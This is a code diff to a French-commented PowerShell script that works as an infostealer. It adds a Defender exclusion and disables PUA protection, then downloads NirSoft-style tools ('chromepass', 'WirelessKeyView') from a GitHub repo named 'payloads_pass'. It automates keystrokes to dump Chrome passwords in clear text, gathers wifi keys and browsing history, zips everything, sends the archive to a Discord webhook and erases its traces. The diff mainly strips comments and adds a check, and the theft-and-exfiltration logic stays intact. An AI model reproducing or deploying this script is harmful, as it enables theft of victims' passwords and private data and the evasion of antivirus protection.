@@ -17,19 +17,19 @@ if (Test-Path $basePath) {
     Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
 }
 
-Write-Host "[*] Ajout exclusion Defender..." -ForegroundColor Yellow
+Write-Host "[*] Ajout exclusion Defender et desactivation PUA..." -ForegroundColor Yellow
 Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
+Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue
 
 New-Item -ItemType Directory -Path $basePath -Force | Out-Null
 New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
 
-# Téléchargement des outils depuis le dépôt GitHub (incluant l'outil de dump Chrome)
+# Téléchargement des outils depuis le dépôt GitHub
 Write-Host "[*] Telechargement des outils..." -ForegroundColor Yellow
 try {
     Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WirelessKeyView.exe" -OutFile "$basePath\WirelessKeyView.exe" -ErrorAction Stop
     Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/BrowsingHistoryView.exe" -OutFile "$basePath\BrowsingHistoryView.exe" -ErrorAction Stop
     Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WNetWatcher.exe" -OutFile "$basePath\WNetWatcher.exe" -ErrorAction Stop
-    # Télécharge ton outil GUI de mots de passe (ex: chromepass.exe ou WebBrowserPassView.exe)
     Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/chromepass.exe" -OutFile "$basePath\chromepass.exe" -ErrorAction Stop
     Write-Host "[+] Outils telecharges avec succes !" -ForegroundColor Green
 } catch {
@@ -46,38 +46,34 @@ $outputPath = "$basePath\passwords.txt"
 "=== CREDENTIALS CHROME (EN CLAIR) ===" | Out-File -FilePath $outputPath -Encoding UTF8
 
 if (Test-Path "$basePath\chromepass.exe") {
-    # Lancement de l'outil au premier plan pour autoriser les frappes de clavier
     $process = Start-Process -FilePath "$basePath\chromepass.exe" -PassThru
-    Start-Sleep -Seconds 3 # Laisse le temps à l'application de s'ouvrir et de charger les données
+    Start-Sleep -Seconds 3
 
-    # Activation de la fenêtre graphique via un objet .NET (nécessaire pour l'envoi de touches)
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-Type -TypeDefinition @"
-    using System;
-    using System.Runtime.InteropServices;
-    public class WindowHelper {
-        [DllImport("user32.dll")]
-        public static extern bool SetForegroundWindow(IntPtr hWnd);
-    }
+    if ($process) {
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -TypeDefinition @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class WindowHelper {
+            [DllImport("user32.dll")]
+            public static extern bool SetForegroundWindow(IntPtr hWnd);
+        }
 "@
-    [WindowHelper]::SetForegroundWindow($process.MainWindowHandle) | Out-Null
-    Start-Sleep -Seconds 1
+        [WindowHelper]::SetForegroundWindow($process.MainWindowHandle) | Out-Null
+        Start-Sleep -Seconds 1
 
-    # Simulation des touches clavier : Ctrl+A (Tout sélectionner) puis Ctrl+S (Sauvegarder) ou équivalent selon l'outil
-    # Exemple universel NirSoft : Ctrl+A puis Ctrl+S pour enregistrer le rapport, ou frappes directes
-    [System.Windows.Forms.SendKeys]::SendWait("^a")
-    Start-Sleep -Milliseconds 500
-    [System.Windows.Forms.SendKeys]::SendWait("^s")
-    Start-Sleep -Seconds 1
+        [System.Windows.Forms.SendKeys]::SendWait("^a")
+        Start-Sleep -Milliseconds 500
+        [System.Windows.Forms.SendKeys]::SendWait("^s")
+        Start-Sleep -Seconds 1
 
-    # Saisit le chemin de sauvegarde automatique dans la boîte de dialogue de l'outil
-    [System.Windows.Forms.SendKeys]::SendWait($outputPath)
-    Start-Sleep -Milliseconds 500
-    [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
-    Start-Sleep -Seconds 2
+        [System.Windows.Forms.SendKeys]::SendWait($outputPath)
+        Start-Sleep -Milliseconds 500
+        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
+        Start-Sleep -Seconds 2
 
-    # Fermeture propre de l'outil graphique
-    Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
+        Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
+    }
 } else {
     Add-Content -Path $outputPath -Value "[!] Outil chromepass.exe introuvable."
 }
@@ -95,7 +91,6 @@ if (Test-Path "$basePath\WNetWatcher.exe") {
 
 Start-Sleep -Seconds 2
 
-# Vérification et sécurisation des fichiers générés
 foreach ($file in @("passwords.txt", "wifi.txt", "history.txt", "connected_devices.txt")) {
     $filePath = "$basePath\$file"
     if (!(Test-Path $filePath) -or ((Get-Item $filePath).Length -eq 0)) {
@@ -108,7 +103,6 @@ Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
 
 if (!(Test-Path $dumpFile)) { exit 1 }
 
-# Envoi du fichier ZIP sur le webhook Discord
 Write-Host "[*] Envoi sur Discord..." -ForegroundColor Yellow
 if (-not ("System.Net.Http.HttpClient" -as [type])) {
     $httpPath = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64\" -Recurse -Filter "System.Net.Http.dll" | Select-Object -First 1 -ExpandProperty FullName
@@ -131,7 +125,6 @@ try {
     Write-Host "[-] Erreur lors de l'envoi Discord : $_" -ForegroundColor Red
 }
 
-# Nettoyage final sécurisé
 Stop-Process -Name "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher", "chromepass" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 1
 Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
